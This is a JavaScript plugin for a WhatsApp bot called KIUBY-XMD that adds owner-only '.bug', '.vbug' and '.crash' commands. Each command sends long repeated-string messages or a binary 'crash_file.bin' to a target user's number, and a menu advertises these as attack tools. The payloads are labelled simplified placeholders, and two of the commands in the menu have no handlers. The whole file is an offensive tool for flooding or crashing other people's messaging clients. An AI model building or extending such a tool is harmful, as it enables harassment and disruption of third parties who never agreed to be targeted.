const { bwmxmd } = require('../core/commandHandler');

// Payloads for various bug/crash commands (Simplified representations)
const payloads = {
    bug: "B_U_G_P_A_Y_L_O_A_D_".repeat(500),
    vbug: "V_I_R_U_S_P_A_Y_L_O_A_D_".repeat(800),
    lbug: "L_A_G_P_A_Y_L_O_A_D_".repeat(1000),
    crash: "C_R_A_S_H_P_A_Y_L_O_A_D_".repeat(1500),
    sbug: "S_Y_S_T_E_M_P_A_Y_L_O_A_D_".repeat(2000)
};

bwmxmd({
    pattern: "bug",
    category: "owner",
    description: "Send a standard bug payload to target",
    filename: __filename
}, async (from, client, conText) => {
    const { q, reply, isSuperUser, mek } = conText;
    if (!isSuperUser) return reply("❌ This command is restricted to KIUBY-XMD SuperUsers.");
    if (!q) return reply("🎯 Provide a target JID or mention a user.\n\nExample: .bug 2547XXXXXXXX@s.whatsapp.net");

    const target = q.includes("@") ? q : q + "@s.whatsapp.net";
    await reply(`🚀 Sending *Level 1 Bug* to ${target}...`);

    await client.sendMessage(target, { text: payloads.bug }, { quoted: mek });
    reply("✅ Attack delivered.");
});

bwmxmd({
    pattern: "vbug",
    category: "owner",
    description: "Send a virus bug payload to target",
    filename: __filename
}, async (from, client, conText) => {
    const { q, reply, isSuperUser, mek } = conText;
    if (!isSuperUser) return reply("❌ This command is restricted to KIUBY-XMD SuperUsers.");
    if (!q) return reply("🎯 Provide a target JID or mention a user.");

    const target = q.includes("@") ? q : q + "@s.whatsapp.net";
    await reply(`🚀 Sending *Level 2 Virus Bug* to ${target}...`);

    await client.sendMessage(target, { text: payloads.vbug }, { quoted: mek });
    reply("✅ Attack delivered.");
});

bwmxmd({
    pattern: "crash",
    category: "owner",
    description: "Send a heavy crash payload to target",
    filename: __filename
}, async (from, client, conText) => {
    const { q, reply, isSuperUser, mek } = conText;
    if (!isSuperUser) return reply("❌ This command is restricted to KIUBY-XMD SuperUsers.");
    if (!q) return reply("🎯 Provide a target JID or mention a user.");

    const target = q.includes("@") ? q : q + "@s.whatsapp.net";
    await reply(`🧨 Sending *Level 5 CRASH Payload* to ${target}...`);

    await client.sendMessage(target, {
        document: Buffer.from(payloads.crash),
        mimetype: "application/octet-stream",
        fileName: "crash_file.bin",
        caption: "☠️ System Overload"
    }, { quoted: mek });

    reply("✅ Heavy payload delivered.");
});

bwmxmd({
    pattern: "bugs",
    aliases: ["bugmenu", "attack"],
    category: "owner",
    description: "Display the available attack/bug commands"
}, async (from, client, conText) => {
    const { reply, isSuperUser } = conText;
    if (!isSuperUser) return reply("❌ Restricted to SuperUsers.");

    const menu = `💀 *𝐊𝐈𝐔𝐁𝐘-𝐗𝐌𝐃 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎𝐎𝐋𝐒* 💀

Available Bug Commands:
▸ .bug <target> - Standard payload
▸ .vbug <target> - Virus payload
▸ .lbug <target> - Lag payload
▸ .sbug <target> - System payload
▸ .crash <target> - Heavy crash payload

⚠️ *WARNING:* Use these tools responsibly. KIUBY-XMD is not responsible for any misuse or bans resulting from these commands.`;

    reply(menu);
});
